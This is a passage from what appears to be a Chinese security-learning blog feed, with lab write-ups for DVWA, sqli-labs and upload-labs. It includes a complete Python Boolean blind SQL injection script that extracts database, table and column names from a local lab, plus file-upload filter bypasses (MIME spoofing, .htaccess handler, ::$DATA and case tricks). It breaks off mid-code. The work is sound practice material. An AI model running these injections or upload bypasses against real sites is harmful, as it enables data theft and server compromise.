class="hljs-string">"&amp;Login=Login&amp;user_token="</span>+new_tokennew_token=getToken(requal,header)i = i+<span class="hljs-number">1</span><span class="hljs-built_in">print</span>(i,<span class="hljs-string">'admin'</span>,new_token,requal)<span class="hljs-keyword">if</span> (i == <span class="hljs-number">10</span>):<span class="hljs-keyword">break</span></code></pre><p><img src="./8.png" srcset="/img/loading.gif" alt=""></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol><li>high等级，在爆破密码这一关的，就可以通过python现在index.php直接获取user_token值</li><li>把session_id放置于服务器端且无法不能在前端可见之处进行验证</li><li>审计Anti机制挺有意思，虽然这个比较简单，但还是满有收获的。</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>CSRF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql盲注(附python脚本)</title>
    <link href="/2019/02/20/sql%E7%9B%B2%E6%B3%A8-%E9%99%84python%E8%84%9A%E6%9C%AC/"/>
    <url>/2019/02/20/sql%E7%9B%B2%E6%B3%A8-%E9%99%84python%E8%84%9A%E6%9C%AC/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>写在前面，学sql盲注最麻烦不过对脚本编写，会努力学习算法，代码效率还是太低。</p><p>select user(); 取得当前登陆MYsql数据库的账户名字<br>select top 1:SELECT TOP 子句规定要返回的记录的数目.<br>1。基于布尔的sql注入<br><img src="./1.png" srcset="/img/loading.gif" alt=""><br>上图是可以通过布尔注入确定出登陆账户名</p><h1 id="布尔盲注知识点（Python脚本代码）"><a href="#布尔盲注知识点（Python脚本代码）" class="headerlink" title="布尔盲注知识点（Python脚本代码）"></a>布尔盲注知识点（Python脚本代码）</h1><blockquote><blockquote><p>布尔注入通过网页的正常反馈信息确定值.<br>以下是关于几个注入用到函数</p></blockquote></blockquote><ol><li>length((select x from x where x ))</li><li>ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101 –+<br>__(substr(a,b,c) 从b位置开始，截取字符串a的c长度.</li><li>ascii(substr((select database(),1,1)))=98</li><li>regexp正则注入（没用到，技术不够，有机会在补）</li></ol><p>布尔盲注：<br>1.猜解数据库长度&gt;&gt;猜解数据库名&gt;&gt;猜解表数&gt;&gt;猜解表长度&gt;&gt;猜解表名&gt;&gt;猜解需要表列个数&gt;&gt;猜解admin表各列的长度&gt;&gt;猜解admin各列的列名&gt;&gt;猜解admin每个列字段数&gt;&gt;猜解每个字段长度&gt;&gt;爆破每个字段值<br>url=”<a href="http://127.0.0.1/sqlilabs/Less-5/?id=1&#39;&quot;" target="_blank" rel="noopener">http://127.0.0.1/sqlilabs/Less-5/?id=1&#39;&quot;</a></p><h1 id="猜解数据库长度"><a href="#猜解数据库长度" class="headerlink" title="猜解数据库长度"></a>猜解数据库长度</h1><p>%d=(select length(database()))<br><img src="./%E7%8C%9C%E8%A7%A3%E6%95%B0%E6%8D%AE%E5%BA%93%E9%95%BF%E5%BA%A6.png" srcset="/img/loading.gif" alt=""> </p><h1 id="猜解数据库名字"><a href="#猜解数据库名字" class="headerlink" title="猜解数据库名字"></a>猜解数据库名字</h1><p>%d=ascii(substr(database(),%d,1))<br><img src="./%E7%8C%9C%E8%A7%A3%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E5%AD%97.png" srcset="/img/loading.gif" alt=""> </p><h1 id="猜解表数"><a href="#猜解表数" class="headerlink" title="猜解表数"></a>猜解表数</h1><p>%d=(select count(table_name) from information_schema.tables where table_schema=database())–+<br><img src="./%E7%8C%9C%E8%A7%A3%E8%A1%A8%E6%95%B0.png" srcset="/img/loading.gif" alt=""> </p><h1 id="猜解表名长度"><a href="#猜解表名长度" class="headerlink" title="猜解表名长度"></a>猜解表名长度</h1><p>%d=length((select table_name from information_schema.tables where table_schema=database() limit %d,1 ))–+’<br><img src="./%E7%8C%9C%E8%A7%A3%E8%A1%A8%E5%90%8D%E9%95%BF%E5%BA%A6.png" srcset="/img/loading.gif" alt=""> </p><h1 id="猜解表名"><a href="#猜解表名" class="headerlink" title="猜解表名"></a>猜解表名</h1><p>%d=ascii(substr((select table_name from information_schema.tables where table_schema=database() limit %d,1  ),%d,1))–+’<br><img src="./%E7%8C%9C%E8%A7%A3%E8%A1%A8%E5%90%8D.png" srcset="/img/loading.gif" alt=""><br><img src="./%E7%8C%9C%E8%A7%A3%E8%A1%A8%E5%90%8D1.png" srcset="/img/loading.gif" alt=""> </p><h1 id="猜解需要表列个数"><a href="#猜解需要表列个数" class="headerlink" title="猜解需要表列个数"></a>猜解需要表列个数</h1><p>%d=(select count(column_name) from information_schema.columns where table_name = “%s”)–+<br><img src="./%E7%8C%9C%E8%A7%A3%E9%9C%80%E8%A6%81%E8%A1%A8%E5%88%97%E4%B8%AA%E6%95%B0.png" srcset="/img/loading.gif" alt=""> </p><h1 id="猜解admin表各列的长度"><a href="#猜解admin表各列的长度" class="headerlink" title="猜解admin表各列的长度"></a>猜解admin表各列的长度</h1><p> %d=length((select column_name from information_schema.columns where table_name=”users” limit %d,1 ))–+<br>![]./猜解admin表各列的长度.png) </p><h1 id="猜解admin各列的列名"><a href="#猜解admin各列的列名" class="headerlink" title="猜解admin各列的列名"></a>猜解admin各列的列名</h1><p>%d=ascii(substr((select column_name from information_schema.columns where table_name=”users” limit %d,1),%d,1))–+<br><img src="./%E7%8C%9C%E8%A7%A3admin%E5%90%84%E5%88%97%E7%9A%84%E5%88%97%E5%90%8D.png" srcset="/img/loading.gif" alt=""> </p><h1 id="计算每个列的字段数select-count-id-from-users"><a href="#计算每个列的字段数select-count-id-from-users" class="headerlink" title="计算每个列的字段数select count(id) from users;"></a>计算每个列的字段数select count(id) from users;</h1><h1 id="猜解每个字段长度-select-length-select-id-from-users-limit-0-1"><a href="#猜解每个字段长度-select-length-select-id-from-users-limit-0-1" class="headerlink" title="猜解每个字段长度 select length((select id from users limit 0,1))"></a>猜解每个字段长度 select length((select id from users limit 0,1))</h1><h1 id="猜解每个字段值select-ascii-substr-select-id-from-users-limit-0-1-1-1"><a href="#猜解每个字段值select-ascii-substr-select-id-from-users-limit-0-1-1-1" class="headerlink" title="猜解每个字段值select ascii(substr((select id from users limit 0,1),1,1))"></a>猜解每个字段值select ascii(substr((select id from users limit 0,1),1,1))</h1><pre><code class="hljs routeros">import requests<span class="hljs-attribute">db_length</span>=1<span class="hljs-attribute">db_url</span>=<span class="hljs-string">''</span><span class="hljs-attribute">db_name</span>=<span class="hljs-string">''</span><span class="hljs-attribute">db_ascii</span>=1<span class="hljs-attribute">db_place</span>=1<span class="hljs-attribute">tb_sum</span>=1<span class="hljs-attribute">tb_url</span>=<span class="hljs-string">''</span><span class="hljs-attribute">tb_num1</span>=0<span class="hljs-attribute">tb_lname</span>=0tb_array=[]<span class="hljs-attribute">tb_nameasc</span>=0<span class="hljs-attribute">tb_namenum</span>=0<span class="hljs-attribute">tb_namepla</span>=0<span class="hljs-attribute">tb_nameurl</span>=<span class="hljs-string">''</span><span class="hljs-attribute">tb_name</span>=<span class="hljs-string">''</span>tb_arrayname=[]<span class="hljs-comment">#猜解数据库名长度</span><span class="hljs-builtin-name">print</span>(<span class="hljs-string">'开始猜解数据库名长度'</span>)<span class="hljs-attribute">url</span>=<span class="hljs-string">"http://127.0.0.1/sqlilabs/Less-5/?id=1'"</span>   <span class="hljs-keyword">for</span> db_length <span class="hljs-keyword">in</span> range(1,100):    <span class="hljs-attribute">db_url</span>=url+'and %d=(select length(database()))--+<span class="hljs-string">'%(db_length)</span><span class="hljs-string">    r=requests.get(db_url)</span><span class="hljs-string">    if '</span>You are <span class="hljs-keyword">in</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span>.<span class="hljs-string">' in r.text:</span><span class="hljs-string">        print('</span>[!] <span class="hljs-string">'+db_url)</span><span class="hljs-string">        print('</span>猜解结束<span class="hljs-string">')</span><span class="hljs-string">        break</span><span class="hljs-string">    else:</span><span class="hljs-string">        print('</span>[x] <span class="hljs-string">'+db_url)</span><span class="hljs-string">print('</span>数据库名长度：%d<span class="hljs-string">'%(db_length))        </span><span class="hljs-string">#猜解数据库名</span><span class="hljs-string">#猜解数据库名ascii(substr(database(),x,1)</span><span class="hljs-string">print('</span>----------------------------------------------<span class="hljs-string">')</span><span class="hljs-string">print('</span>\n\n正在猜解数据库名<span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span>.<span class="hljs-string">')</span><span class="hljs-string">db_urlname='</span><span class="hljs-keyword">and</span> %<span class="hljs-attribute">d</span>=ascii(substr(database(),%d,1))--+'%(db_ascii,db_place)<span class="hljs-keyword">for</span> db_place <span class="hljs-keyword">in</span> range(1,db_length+1):    <span class="hljs-keyword">for</span> db_ascii <span class="hljs-keyword">in</span> range(0,127):        <span class="hljs-attribute">db_urlname</span>=url+'and %<span class="hljs-attribute">d</span>=ascii(substr(database(),%d,1))--+'%(db_ascii,db_place)        <span class="hljs-attribute">r</span>=requests.get(db_urlname)        <span class="hljs-keyword">if</span> <span class="hljs-string">'You are in...........'</span> <span class="hljs-keyword">in</span> r.text:            <span class="hljs-attribute">db_name</span>=db_name+chr(db_ascii)            <span class="hljs-builtin-name">print</span>(<span class="hljs-string">'[!] '</span>+db_name)            break        <span class="hljs-keyword">else</span>:            continue<span class="hljs-builtin-name">print</span>(<span class="hljs-string">'end.......'</span>)<span class="hljs-builtin-name">print</span>(<span class="hljs-string">'数据库名：'</span>+db_name)<span class="hljs-comment">#猜解表数 select count(table_name)  from information_schema.tables where table_schema='security';</span><span class="hljs-builtin-name">print</span>(<span class="hljs-string">'\n\n开始猜解表数.......'</span>)<span class="hljs-keyword">for</span> tb_sum <span class="hljs-keyword">in</span> range(1,10):    <span class="hljs-attribute">tb_url</span>=url+'and %d=(select count(table_name)  <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=database())--+'%(tb_sum)    <span class="hljs-attribute">r</span>=requests.get(tb_url)    <span class="hljs-keyword">if</span> <span class="hljs-string">'You are in...........'</span> <span class="hljs-keyword">in</span> r.text:        <span class="hljs-builtin-name">print</span>(<span class="hljs-string">'[!] '</span>+tb_url)        break    <span class="hljs-keyword">else</span>:        <span class="hljs-builtin-name">print</span>(<span class="hljs-string">'[x] '</span>+tb_url)<span class="hljs-builtin-name">print</span>(<span class="hljs-string">'猜解表数结束'</span>)<span class="hljs-builtin-name">print</span>(<span class="hljs-string">'表数：%d'</span>%(tb_sum))<span class="hljs-comment">#猜解表名长度select length((select table_name from information_schema.tables where table_schema=database() limit 0,1 ));</span><span class="hljs-comment">#+-----------------------------------------------------------------------------------------------------+</span><span class="hljs-comment">#| length((select table_name from information_schema.tables where table_schema=database() limit 0,1 )) |</span><span class="hljs-comment">#+-----------------------------------------------------------------------------------------------------+</span><span class="hljs-comment">#|                                                                                                   6 |</span><span class="hljs-comment"># +-----------------------------------------------------------------------------------------------------+</span><span class="hljs-comment"># 1 row in set (0.00 sec)</span><span class="hljs-comment"># mysql&gt; show tables;</span><span class="hljs-comment"># +--------------------+</span><span class="hljs-comment"># | Tables_in_security |</span><span class="hljs-comment"># +--------------------+</span><span class="hljs-comment"># | emails             |</span><span class="hljs-comment"># | referers           |</span><span class="hljs-comment"># | uagents            |</span><span class="hljs-comment"># | users              |</span><span class="hljs-comment"># +--------------------+</span><span class="hljs-comment"># 4 rows in set (0.00 sec)</span><span class="hljs-builtin-name">print</span>(<span class="hljs-string">'\n\n开始猜解每一个表名长度'</span>)<span class="hljs-keyword">for</span> tb_num1 <span class="hljs-keyword">in</span> range(0,tb_sum+1):    <span class="hljs-keyword">for</span> tb_lname <span class="hljs-keyword">in</span> range(1,20):        <span class="hljs-attribute">tb_lengthurl</span>=url+'and %<span class="hljs-attribute">d</span>=length((select table_name <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=database() limit %d,1 ))--+<span class="hljs-string">'%(tb_lname,tb_num1)</span><span class="hljs-string">        r=requests.get(tb_lengthurl)</span><span class="hljs-string">        if '</span>You are <span class="hljs-keyword">in</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span>.<span class="hljs-string">' in r.text:</span><span class="hljs-string">            tb_array.append(tb_lname)</span><span class="hljs-string">            print('</span>[!] %d<span class="hljs-string">'%(tb_lname)+'</span>&gt;&gt;%s<span class="hljs-string">'%(tb_lengthurl))</span><span class="hljs-string">            tb_lname=0</span><span class="hljs-string">            break</span><span class="hljs-string">        else:</span><span class="hljs-string">            continue</span><span class="hljs-string">for i in range(0,len(tb_array)):</span><span class="hljs-string">    print('</span>猜解结束第%d个表名长度分别为：%d<span class="hljs-string">'%(i+1,tb_array[i]))</span><span class="hljs-string">print('</span>猜解各个表名长度结束<span class="hljs-string">')</span><span class="hljs-string">print('</span>\n\n<span class="hljs-string">')</span><span class="hljs-string">#猜解表名 select substr((select table_name from information_schema.tables where table_schema=database() limit 0,1  ),1,1);</span><span class="hljs-string">print('</span>猜解各个表名开始<span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span>.<span class="hljs-string">')</span><span class="hljs-string">for tb_namenum  in range(0,tb_sum):</span><span class="hljs-string">    for tb_namepla in range(1,tb_array[tb_namenum]+1):</span><span class="hljs-string">        for tb_nameasc in range(0,128):</span><span class="hljs-string">            tb_nameurl=url+'</span><span class="hljs-keyword">and</span> %<span class="hljs-attribute">d</span>=ascii(substr((select table_name <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=database() limit %d,1  ),%d,1))--+<span class="hljs-string">'%(tb_nameasc,tb_namenum,tb_namepla)</span><span class="hljs-string">            r=requests.get(tb_nameurl)</span><span class="hljs-string">            if '</span>You are <span class="hljs-keyword">in</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span>.<span class="hljs-string">' in r.text:</span><span class="hljs-string">                tb_name=tb_name+chr(tb_nameasc)</span><span class="hljs-string">                print('</span>[!] <span class="hljs-string">'+tb_name)</span><span class="hljs-string">                break</span><span class="hljs-string">            else:</span><span class="hljs-string">                continue</span><span class="hljs-string">    tb_arrayname.append(tb_name)</span><span class="hljs-string">    tb_name='</span><span class="hljs-string">'</span><span class="hljs-string">    print('</span>\n<span class="hljs-string">')</span><span class="hljs-string">for i in range(0,len(tb_arrayname)):</span><span class="hljs-string">    print('</span>猜解结束第%d个表名为：%s<span class="hljs-string">'%(i+1,tb_arrayname[i]))</span><span class="hljs-string">#猜解列个数</span><span class="hljs-string">cl_osum=[]</span><span class="hljs-string">print('</span>\n\n开始猜解列个数<span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span>.<span class="hljs-string">')</span><span class="hljs-string">for i in range(tb_sum):</span><span class="hljs-string">    for j in range(1,10):</span><span class="hljs-string">        cl_sumurl = url+'</span><span class="hljs-keyword">and</span> %d=(select count(column_name) <span class="hljs-keyword">from</span> information_schema.columns where table_name = <span class="hljs-string">"%s"</span>)--+<span class="hljs-string">'%(j,tb_arrayname[i])</span><span class="hljs-string">        r=requests.get(cl_sumurl)</span><span class="hljs-string">        if '</span>You are <span class="hljs-keyword">in</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span>.<span class="hljs-string">' in r.text:</span><span class="hljs-string">            cl_osum.append(j)</span><span class="hljs-string">            print('</span>[!] <span class="hljs-string">'+cl_sumurl+'</span>&gt;&gt;匹配成功<span class="hljs-string">')</span><span class="hljs-string">            break</span><span class="hljs-string">        else:</span><span class="hljs-string">            continue</span><span class="hljs-string">for i in range(0,tb_sum):</span><span class="hljs-string">    print(tb_arrayname[i]+'</span>列数：%d<span class="hljs-string">'%(cl_osum[i]))</span><span class="hljs-string">print('</span>猜解列个数结束<span class="hljs-string">')</span><span class="hljs-string">#猜解每个表的列数</span><span class="hljs-string">##mysql&gt; select count(column_name) from information_schema.columns where table_name = '</span>users<span class="hljs-string">' limit 0,1;</span><span class="hljs-string">#+--------------------+</span><span class="hljs-string">#| count(column_name) |</span><span class="hljs-string">#+--------------------+</span><span class="hljs-string">#|                  3 |</span><span class="hljs-string">#+--------------------+</span><span class="hljs-string">#1 row in set (0.01 sec)</span><span class="hljs-string"></span><span class="hljs-string"># for i in range(4):</span><span class="hljs-string">#     for j in range(1,10):</span><span class="hljs-string">#         cl_sumurl = url+'</span><span class="hljs-keyword">and</span> %d=(select count(column_name) <span class="hljs-keyword">from</span> information_schema.columns where table_name = <span class="hljs-string">"%s"</span>)--+<span class="hljs-string">'%(j,tb_arrayname[i])</span><span class="hljs-string">#         r=requests.get(cl_sumurl)</span><span class="hljs-string">#         if '</span>You are <span class="hljs-keyword">in</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span>.<span class="hljs-string">' in r.text:</span><span class="hljs-string">#             print(tb_arrayname[i]+'</span>的列数为：%d<span class="hljs-string">'%(j))</span><span class="hljs-string">#             break</span><span class="hljs-string">#         else:</span><span class="hljs-string">#             continue</span><span class="hljs-string">cl_lensum=[]</span><span class="hljs-string">cl_lennam=[]</span><span class="hljs-string">#计算admin列长度即可</span><span class="hljs-string">for j in range(0,4): </span><span class="hljs-string">    for l in range(1,20):</span><span class="hljs-string">        cl_len=url+'</span><span class="hljs-keyword">and</span> %<span class="hljs-attribute">d</span>=length((select column_name <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">"users"</span> limit %d,1 ))--+<span class="hljs-string">'%(l,j)</span><span class="hljs-string">        r= requests.get(cl_len)</span><span class="hljs-string">        if '</span>You are <span class="hljs-keyword">in</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span>.<span class="hljs-string">' in r.text:</span><span class="hljs-string">            cl_lennam.append(l)</span><span class="hljs-string">            print('</span>users&gt;&gt;第%d列长度为：%d<span class="hljs-string">'%(j+1,l))</span><span class="hljs-string">            break</span><span class="hljs-string">        else:</span><span class="hljs-string">            continue</span><span class="hljs-string">print('</span>\n<span class="hljs-string">')</span><span class="hljs-string">print(cl_lennam)</span><span class="hljs-string">#猜解列名</span><span class="hljs-string">#select ascii(substr((select column_name from information_schema.columns where table_name='</span>emails<span class="hljs-string">' limit 0,1),1,1));</span><span class="hljs-string">#+-------------------------------------------------------------------------------------------------------------+</span><span class="hljs-string">#| ascii(substr((select column_name from information_schema.columns where table_name='</span>emails<span class="hljs-string">' limit 0,1),1,1)) |</span><span class="hljs-string">#+-------------------------------------------------------------------------------------------------------------+</span><span class="hljs-string">#|                                                                                                         105 |</span><span class="hljs-string">#+-------------------------------------------------------------------------------------------------------------+</span><span class="hljs-string">#1 row in set (0.01 sec)</span><span class="hljs-string">#想知道users表的3列的各个列名</span><span class="hljs-string">cl_name='</span><span class="hljs-string">'</span><span class="hljs-string">cl_namearr=[]</span><span class="hljs-string">for j in range(0,3):</span><span class="hljs-string">    for i in range(cl_lennam[j]+1):</span><span class="hljs-string">        for cl_ascii in range(0,128):</span><span class="hljs-string">            cl_admin=url+'</span><span class="hljs-keyword">and</span> %<span class="hljs-attribute">d</span>=ascii(substr((select column_name <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">"users"</span> limit %d,1),%d,1))--+<span class="hljs-string">'%(cl_ascii,j,i)</span><span class="hljs-string">            r= requests.get(cl_admin)</span><span class="hljs-string">            if '</span>You are <span class="hljs-keyword">in</span><span class="hljs-string">' in r.text:</span><span class="hljs-string">                cl_name=cl_name+chr(cl_ascii)</span><span class="hljs-string">                print('</span>[~]<span class="hljs-string">'+cl_name)</span><span class="hljs-string">                break</span><span class="hljs-string">            else:</span><span class="hljs-string">                continue</span><span class="hljs-string">    cl_name=cl_name.strip('</span>\x00<span class="hljs-string">')</span><span class="hljs-string">    cl_namearr.append(cl_name)</span><span class="hljs-string">    cl_name='</span><span class="hljs-string">'</span><span class="hljs-string">    print('</span>\n<span class="hljs-string">')</span><span class="hljs-string">print(cl_namearr)</span></code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>uploadlabs_上传绕过</title>
    <link href="/2019/01/02/uploadlabs-%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/"/>
    <url>/2019/01/02/uploadlabs-%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01-客户端JS检查"><a href="#0x01-客户端JS检查" class="headerlink" title="0x01 客户端JS检查"></a>0x01 客户端JS检查</h1><h2 id="pass01"><a href="#pass01" class="headerlink" title="pass01"></a>pass01</h2><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkFile</span>(<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-keyword">var</span> file = <span class="hljs-built_in">document</span>.getElementsByName(<span class="hljs-string">'upload_file'</span>)[<span class="hljs-number">0</span>].value;    <span class="hljs-keyword">if</span> (file == <span class="hljs-literal">null</span> || file == <span class="hljs-string">""</span>) &#123;        alert(<span class="hljs-string">"请选择要上传的文件!"</span>);        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    &#125;    <span class="hljs-comment">//定义允许上传的文件类型</span>    <span class="hljs-keyword">var</span> allow_ext = <span class="hljs-string">".jpg|.png|.gif"</span>;    <span class="hljs-comment">//提取上传文件的类型</span>    <span class="hljs-keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="hljs-string">"."</span>));    <span class="hljs-comment">//判断上传文件类型是否允许上传</span>    <span class="hljs-keyword">if</span> (allow_ext.indexOf(ext_name + <span class="hljs-string">"|"</span>) == <span class="hljs-number">-1</span>) &#123;        <span class="hljs-keyword">var</span> errMsg = <span class="hljs-string">"该文件不允许上传，请上传"</span> + allow_ext + <span class="hljs-string">"类型的文件,当前文件类型为："</span> + ext_name;        alert(errMsg);        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    &#125;&#125;</code></pre><ol><li><p>抓包修改后缀名上传<br>能够成功说明，服务端未对后缀名在进行过滤<br><img src="./1.png" srcset="/img/loading.gif" alt=""></p></li><li><p>修改网页JS源码<br>注意这里需要把JS代码放置于<code>conslo</code>中，否则<code>JS</code>无法运行。回车就能使得<code>2.php</code>文件上传<br><img src="./2.png" srcset="/img/loading.gif" alt=""></p></li></ol><h1 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h1><p><strong>黑名单过滤是一种不安全的方式，黑名单定义了一系列不安全的扩展名，服务器端在接收文件后，与黑名单扩展名对比，如果发现*文件扩展名与黑名单里的扩展名匹配，则认为文件是不合法。</strong></p><blockquote><blockquote><blockquote></blockquote></blockquote></blockquote><ul><li><strong>忽略扩展名</strong></li><li><strong>大小写转换</strong></li><li><strong>小数点空格</strong><blockquote><blockquote><blockquote></blockquote></blockquote></blockquote></li></ul><h1 id="0x02-MIME类型"><a href="#0x02-MIME类型" class="headerlink" title="0x02 MIME类型"></a>0x02 MIME类型</h1><h2 id="Content-Type-学习"><a href="#Content-Type-学习" class="headerlink" title="Content-Type: 学习"></a>Content-Type: 学习</h2><p> 常见的媒体格式类型如下：</p><blockquote><blockquote><blockquote></blockquote><p>text/html ： HTML格式<br>text/plain ：纯文本格式<br>text/xml ：  XML格式<br>image/gif ：gif图片格式<br>image/jpeg ：jpg图片格式<br>image/png：png图片格式<br>以application开头的媒体格式类型：<br>application/xhtml+xml ：XHTML格式<br>application/xml     ： XML数据格式<br>application/atom+xml  ：Atom XML聚合格式<br>application/json    ： JSON数据格式<br>application/pdf       ：pdf格式<br>application/msword  ： Word文档格式<br>application/octet-stream ： 二进制流数据（如常见的文件下载）<br>application/x-www-form-urlencoded ： <form encType=””>中默认的encType，form表单数据被编码为key/value格式发送到服务器（表单默认的提交数据的格式）<br>另外一种常见的媒体格式是上传文件之时使用的：<br>multipart/form-data ： 需要在表单中进行文件上传时，就需要使用该格式</p></blockquote></blockquote><h2 id="pass02"><a href="#pass02" class="headerlink" title="pass02"></a>pass02</h2><pre><code class="hljs ruby">$is_upload = <span class="hljs-literal">false</span>;$msg = null;<span class="hljs-keyword">if</span> (isset($_POST[<span class="hljs-string">'submit'</span>])) &#123;    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;        <span class="hljs-keyword">if</span> (($_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'type'</span>] == <span class="hljs-string">'image/jpeg'</span>) <span class="hljs-params">||</span> ($_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'type'</span>] == <span class="hljs-string">'image/png'</span>) <span class="hljs-params">||</span> ($_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'type'</span>] == <span class="hljs-string">'image/gif'</span>)) &#123;            $temp_file = $_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];            $img_path = UPLOAD_PATH . <span class="hljs-string">'/'</span> . $_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>]                        <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = <span class="hljs-literal">true</span>;            &#125; <span class="hljs-keyword">else</span> &#123;                $msg = <span class="hljs-string">'上传出错！'</span>;            &#125;        &#125; <span class="hljs-keyword">else</span> &#123;            $msg = <span class="hljs-string">'文件类型不正确，请重新上传！'</span>;        &#125;    &#125; <span class="hljs-keyword">else</span> &#123;        $msg = UPLOAD_PATH.<span class="hljs-string">'文件夹不存在,请手工创建！'</span>;    &#125;&#125;</code></pre><p>检查MIME类型是在<code>content-Type</code>中回显，当我上传<code>2.php</code>文件时显示 <code>application/octet-stream</code><br><img src="./3.png" srcset="/img/loading.gif" alt=""><br>当我上传<code>1.jpg</code>时 ，抓包显示 <code>image/jpeg</code><br><img src="./4.png" srcset="/img/loading.gif" alt=""><br>所以我们上传<code>2.php</code>。在抓包中修改<code>content-type</code>中修改值为<code>image/jpeg</code>就可以成功上传<br><img src="./5.png" srcset="/img/loading.gif" alt=""></p><h1 id="0x03-上传可特殊解析后缀"><a href="#0x03-上传可特殊解析后缀" class="headerlink" title="0x03 上传可特殊解析后缀"></a>0x03 上传可特殊解析后缀</h1><h2 id="pass03"><a href="#pass03" class="headerlink" title="pass03"></a>pass03</h2><p>可用脚本加载 .php3 / .phtml<br><img src="./6.png" srcset="/img/loading.gif" alt=""><br>创建phpinfo.php3文件，包含PHP脚本的HTML网页。(这里WINDOWS10无法被正确解析，所以在UBUNTU下。)<br><img src="./7.png" srcset="/img/loading.gif" alt=""></p><h1 id="0x04-htaccess"><a href="#0x04-htaccess" class="headerlink" title="0x04 .htaccess"></a>0x04 .htaccess</h1><h2 id="pass04"><a href="#pass04" class="headerlink" title="pass04"></a>pass04</h2><p>笼统地说，<code>.htaccess</code>可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。</p><p><code>windows</code>下编辑TXT文件内容编辑为 <code>SetHandler applicattion/x-httpd-php</code>&gt;&gt;<code>&quot;.htaccess&quot;</code>另存为桌面上传文件&gt;&gt;上传<code>2.gif</code><br><img src="./8.png" srcset="/img/loading.gif" alt=""></p><h1 id="0x05-点、空、大小、-DATA-绕过"><a href="#0x05-点、空、大小、-DATA-绕过" class="headerlink" title="0x05 点、空、大小、::$DATA_绕过"></a>0x05 点、空、大小、::$DATA_绕过</h1><h2 id="pass05"><a href="#pass05" class="headerlink" title="pass05"></a>pass05</h2><p>源码并没有对大小写进行转换<br>burpsuite抓包大小写混写绕过<br><img src="./9.png" srcset="/img/loading.gif" alt=""><br><img src="./10.png" srcset="/img/loading.gif" alt=""></p><h2 id="pass06"><a href="#pass06" class="headerlink" title="pass06"></a>pass06</h2><p>未去空字符<br><img src="./14.png" srcset="/img/loading.gif" alt=""><br><img src="./15.png" srcset="/img/loading.gif" alt=""></p><h2 id="pass07"><a href="#pass07" class="headerlink" title="pass07"></a>pass07</h2><p><code>windosw</code>对后缀名 空格 点可以自动消去<br>源码未未对点好进行过滤<br><img src="./16.png" srcset="/img/loading.gif" alt=""><br>抓包添加引号即可绕过，上传成功<br><img src="./17.png" srcset="/img/loading.gif" alt=""></p><h2 id="pass08-DATA"><a href="#pass08-DATA" class="headerlink" title="pass08 ::$DATA"></a>pass08 ::$DATA</h2><p>::$DATA 绕过<br>或者 2.php. . 绕过<br><img src="./18.png" srcset="/img/loading.gif" alt=""><br><img src="./19.png" srcset="/img/loading.gif" alt=""></p><h2 id="pass09"><a href="#pass09" class="headerlink" title="pass09"></a>pass09</h2><pre><code class="hljs mel">$file_name = <span class="hljs-keyword">trim</span>($_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>]);        $file_name = deldot($file_name);<span class="hljs-comment">//删除文件名末尾的点</span>        $file_ext = strrchr($file_name, <span class="hljs-string">'.'</span>);        $file_ext = strtolower($file_ext); <span 